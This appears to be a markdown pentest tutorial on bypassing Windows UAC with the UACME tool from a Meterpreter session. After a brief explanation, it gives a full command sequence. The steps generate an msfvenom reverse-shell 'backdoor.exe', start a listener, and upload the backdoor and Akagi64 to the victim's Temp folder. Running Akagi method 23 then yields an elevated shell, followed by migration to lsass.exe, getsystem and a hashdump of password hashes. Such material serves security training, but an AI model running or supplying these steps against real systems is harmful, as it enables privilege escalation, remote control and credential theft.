# Bypassing UAC

## Explanation

- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.

- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.

- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

## Bypassing UAC with UACME

### In Kali host

1. Start a meterpreter session on an already exploited victim host, migrate to a process used by the system, and trying to get system level privilege (access denied is probably result) : 
```
meterpreter > getuid
meterpreter > migrate -N explorer.exe
meterpreter > getsystem
```

2. Checking if the user is a member of administrators group, CTRL+C for quit shell session : 
```
meterpreter > shell
meterpreter > net localgroup administrators
C:\Windows\system32>^C
Terminate channel 1? [y/N] Y
meterpreter >
```

3. Open another terminal in your Kali, and generate malicious windows executable (a windows meterpreter reverse shell) : 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-local-ip> LPORT=4444 -f exe > 'backdoor.exe'
```

4. Download UACME tool, for obtain Akagi executable : 
```
git clone https://github.com/hfiref0x/UACME
```

5. Start another meterpreter for create multi handler listener : 
```
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <your-local-ip>
msf6 > set LPORT 4444
msf6 > exploit
```

6. Return to the meterpreter session from step 2, and switch current directory to user's temp directory : 
```
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
```

7. Upload a windows meterpreter reverse shell and Akagi files in victim host :
```
meterpreter > upload /root/backdoor.exe
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe .
```

### In victim host

Start Akagi64 executable with 23 argument (for bypassing UAC), and your windows meterpreter reverse shell  : 
```
meterpreter > shell
meterpreter > dir
C:\Users\admin\AppData\Local\Temp > .\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

### In listener

And finally, go to your multi handler listener, migrate to processus, and verify your new privileges : 
```
meterpreter > migrate -N lsass.exe
meterpreter > getsystem
meterpreter > getuid
meterpreter > getprivs
meterpreter > hashdump
```